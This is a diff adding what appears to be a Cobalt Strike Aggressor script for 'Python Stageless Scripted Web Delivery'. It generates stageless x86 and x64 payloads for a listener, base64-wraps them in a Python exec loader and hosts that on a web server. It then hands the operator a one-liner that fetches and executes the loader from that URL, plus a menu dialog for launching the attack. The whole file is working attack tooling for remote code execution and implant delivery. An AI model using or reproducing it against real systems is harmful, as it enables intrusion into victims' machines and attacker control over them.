@@ -1,0 +1,51 @@
+# Python Stageless Scripted Web Delivery
+
+# setup our stageless Python Web Delivery attack
+sub setup_attack {
+	local('%options $x86payload $x64payload $url $script');
+	%options = $3;
+
+	# generate our stageless x86 payload
+	artifact_stageless(%options["listener"], "raw", "x86", $null, $this);
+	yield;
+	$x86payload = $1;
+
+	# generate our stageless x64 payload
+	artifact_stageless(%options["listener"], "raw", "x64", $null, $this);
+	yield;
+	$x64payload = $1;
+
+	# transform the script.
+	$script = [common.ArtifactUtils buildPython: $x86payload, $x64payload];
+	$script = "import base64; exec base64.b64decode(\"" . base64_encode($script) . "\")";
+
+	# host the script!
+	$url = site_host(%options["host"], %options["port"], %options["uri"], $script, "text/plain", "Scripted Web Delivery (python)"); 
+
+	# tell the user our URL
+	prompt_text("One-liner: ", "python -c \"import urllib2; exec urllib2.urlopen(' $+ $url $+ ').read();\"", {});
+}
+
+# create a popup menu!
+popup attacks {
+	item "Python Web Delivery (S)" {
+		local('$dialog %defaults');
+
+		# setup our defaults
+		%defaults["uri"]  = "/a";
+		%defaults["host"] = localip();
+		%defaults["port"] = 80;
+
+		# create our dialog
+		$dialog = dialog("Python Web Delivery (Stageless)", %defaults, &setup_attack);
+		dialog_description($dialog, "A stageless version of the Python Web Delivery attack.");
+		drow_text($dialog, "uri", "URI Path: ", 20);
+		drow_text($dialog, "host", "Local Host: ");
+		drow_text($dialog, "port", "Local Port: ");
+		drow_listener_stage($dialog, "listener", "Listener: ");
+		dbutton_action($dialog, "Launch");
+
+		# show our dialog
+		dialog_show($dialog);
+	}
+}
